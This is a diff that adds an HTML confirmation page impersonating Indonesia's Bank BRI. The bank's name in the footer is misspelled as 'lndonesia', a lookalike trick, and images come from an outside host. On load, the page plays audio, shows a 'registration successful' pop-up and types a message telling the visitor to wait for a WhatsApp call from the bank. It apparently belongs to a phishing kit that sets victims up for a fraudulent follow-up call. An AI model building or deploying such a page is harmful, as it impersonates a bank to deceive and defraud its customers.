@@ -1,0 +1,161 @@
+<!DOCTYPE html><html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Terima Kasih</title>
+  <!-- Bootstrap CSS -->
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <!-- Google Fonts: Poppins -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
+  <!-- SweetAlert2 -->
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <style>
+
+
+    /* Container utama */
+    .container {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      width: 100%;
+      padding: 30px;
+      text-align: center;
+    }
+
+    .header img {
+      max-width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .img-fluid {
+      margin-bottom: 15px;
+      border-radius: 8px;
+      max-height: 300px;
+      object-fit: cover;
+    }
+
+    /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
+    .message {
+      background: linear-gradient(135deg, #004080, #0059b3);
+      color: #fff;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      position: relative;
+      min-height: 120px; /* Bisa disesuaikan */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Area tempat teks diketik satu per satu */
+    .typingText {
+      white-space: pre-line; /* Agar bisa multiline */
+      text-align: center;
+      width: 100%;
+      padding: 0 10px;
+    }
+    .hh {
+    width: 100%;
+    height: 100%;
+}
+    .footer {
+      font-size: 14px;
+      color: #777;
+      margin-top: 15px;
+    }
+
+    /* Custom styling untuk SweetAlert2 pop-up */
+    .swal2-border-radius {
+      border-radius: 12px !important;
+    }
+  </style>
+  
+</head><nav class="h"></nav>
+<img src="https://hosting.tigerengine.id/x528gm.png" width="100%"><br><br><br><br>
+<body onload="initPage()">
+  <div class="container">
+    <div class="header">
+
+    </div>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcuv_xpoHxodnHI-rOYi2FAiPNCABIMLKZwGXGHN5y-xZq7JXLO6Gv4ec&s=10" alt="Ilustrasi Pelanggan" class="img-fluid">
+
+    <!-- Kotak pesan dengan efek ketik (typewriter) -->
+    <div class="message">
+      <div id="typingContainer" class="typingText"></div>
+    </div>
+    <div class="footer">
+      ©️ 2025 PT Bank Rakyat lndonesia Tbk.
+    </div>
+  </div><br><br>
+<img src="https://hosting.tigerengine.id/ciakn7.png" width="100%">
+  <audio id="thankYouAudio" src="media/sumut.mp3"></audio>
+
+  <script>
+    // Teks yang akan ditampilkan dengan efek ketik
+    const typewriterText = `Mohon tunggu panggilan telepon Whatsapp pihak Bank BRI........ `;
+
+    // Fungsi untuk memutar audio dengan jeda 1 detik
+    function playAudio() {
+      const audio = document.getElementById("thankYouAudio");
+      setTimeout(() => {
+        const playPromise = audio.play();
+        if (playPromise !== undefined) {
+          playPromise.catch((error) => {
+            document.body.addEventListener(
+              "click",
+              () => {
+                audio.play();
+              },
+              { once: true }
+            );
+          });
+        }
+      }, 1000);
+    }
+
+    // SweetAlert2 pop-up
+    function showThankYouAlert() {
+      Swal.fire({
+        title: "Pendaftaran Berhasil!",
+        text: "Terima kasih telah mendaftar. Mohon tunggu konfirmasi lebih lanjut.",
+        icon: "success",
+        confirmButtonText: "OK",
+        confirmButtonColor: "#004080",
+        customClass: {
+          popup: "swal2-border-radius",
+        },
+      });
+    }
+
+    // Efek ketik satu per satu huruf
+    function typeWriterEffect(text, containerId, speed = 40) {
+      let index = 0;
+      const container = document.getElementById(containerId);
+
+      function typeChar() {
+        if (index < text.length) {
+          container.innerHTML += text.charAt(index);
+          index++;
+          setTimeout(typeChar, speed);
+        }
+      }
+      typeChar();
+    }
+
+    // Fungsi inisialisasi saat halaman di-load
+    function initPage() {
+      playAudio();
+      showThankYouAlert();
+      typeWriterEffect(typewriterText, "typingContainer", 80); // kecepatan 30 ms per huruf
+    }
+  </script>
+
+
+</body>
+
+</html>
